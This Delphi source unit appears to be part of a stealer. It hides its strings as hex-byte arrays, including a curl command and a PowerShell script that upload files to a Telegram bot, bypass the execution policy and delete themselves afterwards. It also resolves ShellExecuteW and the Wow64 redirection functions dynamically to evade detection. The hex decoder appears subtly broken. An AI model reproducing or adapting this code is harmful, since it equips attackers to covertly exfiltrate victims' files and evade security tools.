unit CodeUnitTelegram;

interface

uses GetLibModHandleTelegram;

const
  // kernel32.dll
  HSH0:Array[0..11] of string=('6B','65','72','6E','65','6C','33','32','2E','64','6C','6C');
  // shell32.dll
  HSH1:Array[0..10] of string=('73','68','65','6C','6C','33','32','2E','64','6C','6C');
  // ShellExecuteW
  HSH2:Array[0..12] of string=('53','68','65','6C','6C','45','78','65','63','75','74','65','57');
  // Wow64DisableWow64FsRedirection
  HSH3:Array[0..29] of string=('57','6F','77','36','34','44','69','73','61','62','6C','65','57','6F','77',
  '36','34','46','73','52','65','64','69','72','65','63','74','69','6F','6E');
  // Wow64RevertWow64FsRedirection
  HSH4:Array[0..28] of string=('57','6F','77','36','34','52','65','76','65','72','74','57','6F','77','36',
  '34','46','73','52','65','64','69','72','65','63','74','69','6F','6E');
  // Powershell
  HCOM:Array[0..9] of string=('50','6F','77','65','72','73','68','65','6C','6C');
  // cmd.exe
  HCOM1:Array[0..6] of string=('63','6D','64','2E','65','78','65');
  // /c @curl "https://api.telegram.org/bot
  HCOM2:Array[0..37] of string=('2F','63','20','40','63','75','72','6C','20','22','68','74','74','70','73',
  '3A','2F','2F','61','70','69','2E','74','65','6C','65','67','72','61','6D',
  '2E','6F','72','67','2F','62','6F','74');
  // /sendDocument" -F chat_id="
  HCOM3:Array[0..26] of string=('2F','73','65','6E','64','44','6F','63','75','6D','65','6E','74','22','20',
  '2D','46','20','63','68','61','74','5F','69','64','3D','22');
  // /sendMessage" -F chat_id="
  HCOM33:Array[0..25] of string=('2F','73','65','6E','64','4D','65','73','73','61','67','65','22','20','2D',
  '46','20','63','68','61','74','5F','69','64','3D','22');
  // " -F caption="
  HCOM4:Array[0..13] of string=('22','20','2D','46','20','63','61','70','74','69','6F','6E','3D','22');
  // " -F text="
  HCOM44:Array[0..10] of string=('22','20','2D','46','20','74','65','78','74','3D','22');
  // " -F document=@"
  HCOM5:Array[0..15] of string=('22','20','2D','46','20','64','6F','63','75','6D','65','6E','74','3D','40',
  '22');
  // " --ssl-no-revoke
  HCOM6:Array[0..16] of string=('22','20','2D','2D','73','73','6C','2D','6E','6F','2D','72','65','76','6F',
  '6B','65');
  // -C Invoke-WebRequest -Uri 'https://api.telegram.org/bot
  HCOM7:Array[0..54] of string=('2D','43','20','49','6E','76','6F','6B','65','2D','57','65','62','52','65',
  '71','75','65','73','74','20','2D','55','72','69','20','27','68','74','74',
  '70','73','3A','2F','2F','61','70','69','2E','74','65','6C','65','67','72',
  '61','6D','2E','6F','72','67','2F','62','6F','74');
  // /sendMessage?chat_id=
  HCOM8:Array[0..20] of string=('2F','73','65','6E','64','4D','65','73','73','61','67','65','3F','63','68',
  '61','74','5F','69','64','3D');
  // &text=
  HCOM9:Array[0..5] of string=('26','74','65','78','74','3D');
  // $token = "
  HCOM80:Array[0..9] of string=('24','74','6F','6B','65','6E','20','3D','20','22');
  // "; $chatId = "
  HCOM81:Array[0..13] of string=('22','3B','20','24','63','68','61','74','49','64','20','3D','20','22');
  // "; $filePath = "
  HCOM82:Array[0..15] of string=('22','3B','20','24','66','69','6C','65','50','61','74','68','20','3D','20',
  '22');
  // "; $caption = "
  HCOM83:Array[0..14] of string=('22','3B','20','24','63','61','70','74','69','6F','6E','20','3D','20','22');
  // "; $boundary = [System.Guid]::NewGuid().ToString(); $fileContent = Get-Content -Path $filePath -Raw -Encoding UTF8; $body = @("--$boundary", "Content-Disposition: form-data; name=`"chat_id`"", "", $chatId, "--$boundary", "Content-Disposition: form-data; name=`"caption`"", "", $caption, "--$boundary", "Content-Disposition: form-data; name=`"document`"; filename=`"
  HCOM84:Array[0..364] of string=('22','3B','20','24','62','6F','75','6E','64','61','72','79','20','3D','20',
  '5B','53','79','73','74','65','6D','2E','47','75','69','64','5D','3A','3A',
  '4E','65','77','47','75','69','64','28','29','2E','54','6F','53','74','72',
  '69','6E','67','28','29','3B','20','24','66','69','6C','65','43','6F','6E',
  '74','65','6E','74','20','3D','20','47','65','74','2D','43','6F','6E','74',
  '65','6E','74','20','2D','50','61','74','68','20','24','66','69','6C','65',
  '50','61','74','68','20','2D','52','61','77','20','2D','45','6E','63','6F',
  '64','69','6E','67','20','55','54','46','38','3B','20','24','62','6F','64',
  '79','20','3D','20','40','28','22','2D','2D','24','62','6F','75','6E','64',
  '61','72','79','22','2C','20','22','43','6F','6E','74','65','6E','74','2D',
  '44','69','73','70','6F','73','69','74','69','6F','6E','3A','20','66','6F',
  '72','6D','2D','64','61','74','61','3B','20','6E','61','6D','65','3D','60',
  '22','63','68','61','74','5F','69','64','60','22','22','2C','20','22','22',
  '2C','20','24','63','68','61','74','49','64','2C','20','22','2D','2D','24',
  '62','6F','75','6E','64','61','72','79','22','2C','20','22','43','6F','6E',
  '74','65','6E','74','2D','44','69','73','70','6F','73','69','74','69','6F',
  '6E','3A','20','66','6F','72','6D','2D','64','61','74','61','3B','20','6E',
  '61','6D','65','3D','60','22','63','61','70','74','69','6F','6E','60','22',
  '22','2C','20','22','22','2C','20','24','63','61','70','74','69','6F','6E',
  '2C','20','22','2D','2D','24','62','6F','75','6E','64','61','72','79','22',
  '2C','20','22','43','6F','6E','74','65','6E','74','2D','44','69','73','70',
  '6F','73','69','74','69','6F','6E','3A','20','66','6F','72','6D','2D','64',
  '61','74','61','3B','20','6E','61','6D','65','3D','60','22','64','6F','63',
  '75','6D','65','6E','74','60','22','3B','20','66','69','6C','65','6E','61',
  '6D','65','3D','60','22');
  // `"", "Content-Type: text/plain", "", $fileContent, "--$boundary--"); $byteArray = [System.Text.Encoding]::UTF8.GetBytes($body -join "`r`n"); Invoke-WebRequest -Uri "https://api.telegram.org/bot$token/sendDocument" -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $byteArray; Remove-Item -Path $MyInvocation.MyCommand.Path -Force;
  HCOM85:Array[0..353] of string=('60','22','22','2C','20','22','43','6F','6E','74','65','6E','74','2D','54',
  '79','70','65','3A','20','74','65','78','74','2F','70','6C','61','69','6E',
  '22','2C','20','22','22','2C','20','24','66','69','6C','65','43','6F','6E',
  '74','65','6E','74','2C','20','22','2D','2D','24','62','6F','75','6E','64',
  '61','72','79','2D','2D','22','29','3B','20','24','62','79','74','65','41',
  '72','72','61','79','20','3D','20','5B','53','79','73','74','65','6D','2E',
  '54','65','78','74','2E','45','6E','63','6F','64','69','6E','67','5D','3A',
  '3A','55','54','46','38','2E','47','65','74','42','79','74','65','73','28',
  '24','62','6F','64','79','20','2D','6A','6F','69','6E','20','22','60','72',
  '60','6E','22','29','3B','20','49','6E','76','6F','6B','65','2D','57','65',
  '62','52','65','71','75','65','73','74','20','2D','55','72','69','20','22',
  '68','74','74','70','73','3A','2F','2F','61','70','69','2E','74','65','6C',
  '65','67','72','61','6D','2E','6F','72','67','2F','62','6F','74','24','74',
  '6F','6B','65','6E','2F','73','65','6E','64','44','6F','63','75','6D','65',
  '6E','74','22','20','2D','4D','65','74','68','6F','64','20','50','6F','73',
  '74','20','2D','43','6F','6E','74','65','6E','74','54','79','70','65','20',
  '22','6D','75','6C','74','69','70','61','72','74','2F','66','6F','72','6D',
  '2D','64','61','74','61','3B','20','62','6F','75','6E','64','61','72','79',
  '3D','24','62','6F','75','6E','64','61','72','79','22','20','2D','42','6F',
  '64','79','20','24','62','79','74','65','41','72','72','61','79','3B','20',
  '52','65','6D','6F','76','65','2D','49','74','65','6D','20','2D','50','61',
  '74','68','20','24','4D','79','49','6E','76','6F','63','61','74','69','6F',
  '6E','2E','4D','79','43','6F','6D','6D','61','6E','64','2E','50','61','74',
  '68','20','2D','46','6F','72','63','65','3B');
  // /c timeout 1 && powershell -ExecutionPolicy Bypass -File "
  HCOM86:Array[0..57] of string=('2F','63','20','74','69','6D','65','6F','75','74','20','31','20','26','26',
  '20','70','6F','77','65','72','73','68','65','6C','6C','20','2D','45','78',
  '65','63','75','74','69','6F','6E','50','6F','6C','69','63','79','20','42',
  '79','70','61','73','73','20','2D','46','69','6C','65','20','22');
  // send.ps1
  HCOM87:Array[0..7] of string=('73','65','6E','64','2E','70','73','31');

  function HATS(const hexarr:array of string): Ansistring;
  procedure SEW(hWnd: THandle;
  Operation, FileName, Parameters, Directory: WideString;
  ShowCmd: Integer);
  procedure WoW1(Var Wow64FsEnableRedirection: LongBool);
  procedure WoW2(Var Wow64FsEnableRedirection: LongBool);

implementation

  function HATS(const hexarr:array of string): Ansistring;
  var
   i:Integer;
  function SToI(const S: string): Integer;
  var E: Integer;
  begin
    Val(S, Result,E);
  end;
  function HToS(hex: Ansistring): Ansistring;
  var
  i: Integer;
  begin
    for i:= 1 to Length(hex) div 2 do
    begin
      Result := Result + AnsiChar(SToI('$' +  String(Copy(hex, (i-1) * 2 + 1, 2)) ));
    end;
  end;
  begin
    for i:= 0 to Length(hexarr)-1 do
    begin
      Result :=  HToS(AnsiString(hexarr[i]));
    end;
  end;

  procedure SEW(hWnd: THandle;
    Operation, FileName, Parameters, Directory: WideString;
    ShowCmd: Integer);
  var
  SE: function(hWnd: THandle;
    Operation, FileName, Parameters, Directory: WideString;
    ShowCmd: Integer): HINST; stdcall;
  HM:HMODULE;
  begin
    try
      HM := LoadLibrary(PChar(string(HATS(HSH1))));
      @SE := GetProcAddress(HM, PChar(string(HATS(HSH2))));
      SE(hWnd, Operation, FileName, Parameters, Directory, ShowCmd);
      FreeLibrary(HM);
    except
    ;
    end;
  end;

  procedure WoW1(Var Wow64FsEnableRedirection: LongBool);
  var
  SE: function(Var Wow64FsEnableRedirection: LongBool): LongBool; stdcall;
  HM:HMODULE;
  begin
    try
      HM := LoadLibrary(PChar(string(HATS(HSH0))));
      @SE := GetProcAddress(HM, PChar(string(HATS(HSH3))));
      SE(Wow64FsEnableRedirection);
      FreeLibrary(HM);
    except
    ;
    end;
  end;

  procedure WoW2(Var Wow64FsEnableRedirection: LongBool);
  var
  SE: function(Var Wow64FsEnableRedirection: LongBool): LongBool; stdcall;
  HM:HMODULE;
  begin
    try
      HM := LoadLibrary(PChar(string(HATS(HSH0))));
      @SE := GetProcAddress(HM, PChar(string(HATS(HSH4))));
      SE(Wow64FsEnableRedirection);
      FreeLibrary(HM);
    except
    ;
    end;
  end;

end.